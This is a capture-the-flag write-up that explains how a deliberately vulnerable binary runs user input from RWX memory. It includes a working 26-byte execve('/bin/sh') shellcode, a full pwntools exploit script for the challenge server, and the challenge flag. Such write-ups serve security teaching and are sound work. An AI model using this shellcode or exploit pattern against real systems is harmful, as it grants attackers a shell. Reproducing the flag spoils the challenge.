# Rice Field - Writeup

**CTF:** Neurogrid CTF 2025
**Category:** Pwn (Binary Exploitation)
**Difficulty:** Very Easy
**Points:** 1000
**Flag:** `HTB{~Gohan_to_flag_o_tanoshinde_ne~_697a11325d3ad6da64bbc5fcdd527216}`

## Challenge Description

Takashi, the fearless blade of the East, weary from countless battles, now seeks not war—but warmth. His body aches, his spirit hungers. Upon the road, he discovers a sacred haven: the legendary Rice Field Restaurant, known across the land for its peerless grains. But here, the rice is not served—it is earned. Guide Takashi as he prepares his own perfect bowl, to restore his strength and walk the path once more.

## Initial Analysis

We're provided with a 64-bit ELF executable called `rice_field`. The binary is not stripped and presents a menu-driven interface with Japanese-themed options:

1. Gohan Module: Atsume (Collect rice)
2. Gohan Module: Taku (Cook rice)
3. Shūryō (Exit)

Running `file` on the binary:
```bash
$ file rice_field
rice_field: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

## Vulnerability Discovery

### Key Functions

Using `objdump`, I identified the key functions:
- `main` - Runs a loop that allows exactly 2 menu choices
- `collect_rice` - Adds user input to a global `rice` variable
- `cook_rice` - **The vulnerability**: Allocates RWX memory and executes user input as shellcode

### The Vulnerability: Shellcode Execution

The `cook_rice` function contains the critical vulnerability:

1. **Allocates memory** using `calloc()` for `rice` bytes
2. **Maps RWX memory** using `mmap()` with size = `rice` bytes and protection = 0x7 (READ|WRITE|EXEC)
3. **Reads shellcode** from stdin (`read(0, buffer, rice)`)
4. **Copies to RWX region** using `memcpy()`
5. **Executes the shellcode** with `call rdx` where rdx points to the RWX region

```c
// Simplified vulnerable code flow:
buffer = calloc(rice, 1);
rwx_mem = mmap(NULL, rice, PROT_READ|PROT_WRITE|PROT_EXEC, ...);
read(0, buffer, rice);
memcpy(rwx_mem, buffer, rice);
free(buffer);
((void(*)())rwx_mem)();  // Execute shellcode!
```

### The Catch: Rice Counter

The `rice` global variable has an important constraint:
- **Initial value**: 10 (discovered via `objdump -s -j .data`)
- **Maximum value**: 26 (enforced in `collect_rice`)
- **Check**: `if (rice > 26) fail()`

This means:
- Starting rice = 10
- We can collect up to 16 more rice (10 + 16 = 26)
- Total maximum = 26 bytes for our shellcode

## Exploitation Strategy

### Step 1: Craft Compact Shellcode

We need a shellcode that fits in 26 bytes. Using pwntools, I crafted a compact `execve("/bin/sh")` shellcode:

```python
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f    # "/bin/sh"
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    push 59                       # __NR_execve
    pop rax
    syscall
''')
```

This compiles to exactly 26 bytes: `4831f65648bf2f62696e2f736800574889e74831d26a3b580f05`

### Step 2: Exploit Flow

1. **Connect** to the remote server
2. **Select option 1** (Collect rice) and enter `16` (to reach total of 26)
3. **Select option 2** (Cook rice) and send our 26-byte shellcode
4. **Get shell** and read the flag

### Step 3: Implementation Challenges

#### Challenge 1: Unicode Prompts
The menu uses full-width Unicode characters:
- Prompt: `＞` (U+FF1E, bytes: `\xef\xbc\x9e`) NOT ASCII `>`
- Percent: `％` (U+FF05, bytes: `\xef\xbc\x85`) NOT ASCII `%`

#### Challenge 2: Rice Counter
Initially tried with 26 rice, but failed because:
- `rice` starts at 10 (not 0!)
- 10 + 26 = 36 > 26 → fails validation
- Solution: Collect only 16 (10 + 16 = 26)

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = '154.57.164.68'
PORT = 30094

# 26-byte execve("/bin/sh") shellcode
shellcode = bytes.fromhex('4831f65648bf2f62696e2f736800574889e74831d26a3b580f05')

p = remote(HOST, PORT)

# Wait for menu (full-width > character)
p.recvuntil(b'\xef\xbc\x9e')

# Collect 16 rice (total = 10 + 16 = 26)
p.sendline(b'1')
p.recvuntil(b'\xef\xbc\x85')  # Full-width %
p.sendline(b'16')

# Cook rice (execute shellcode)
p.recvuntil(b'\xef\xbc\x9e')
p.sendline(b'2')
p.send(shellcode)

# Get flag
p.sendline(b'cat flag.txt')
print(p.recvline())

p.interactive()
```

## Running the Exploit

```bash
$ python3 exploit_final.py
[*] Shellcode length: 26 bytes
[*] Using rice amount: 16
[+] Opening connection to 154.57.164.68 on port 30094: Done
[*] Waiting for initial menu...
[*] Collecting 16 rice
[*] Selecting option 2: Cook rice
[*] Sending 26 bytes of shellcode...
[+] FLAG: HTB{~Gohan_to_flag_o_tanoshinde_ne~_697a11325d3ad6da64bbc5fcdd527216}
```

## Summary

This challenge demonstrated:
1. **Classic shellcode execution** via RWX memory mapping
2. **Size constraints** requiring compact shellcode (26 bytes)
3. **State management** with a global counter that affects exploitation
4. **Attention to detail** (Unicode prompts, initial variable values)

The vulnerability was straightforward—direct shellcode execution—but required careful analysis of the binary to understand:
- The rice counter starts at 10, not 0
- Maximum total rice is 26
- Therefore, we can only collect 16 more rice

**Flag:** `HTB{~Gohan_to_flag_o_tanoshinde_ne~_697a11325d3ad6da64bbc5fcdd527216}`

## Files

- [rice_field](rice_field) - Challenge binary
- [exploit_final.py](exploit_final.py) - Working exploit script
- [pwn_rice_field.zip](pwn_rice_field.zip) - Original challenge download
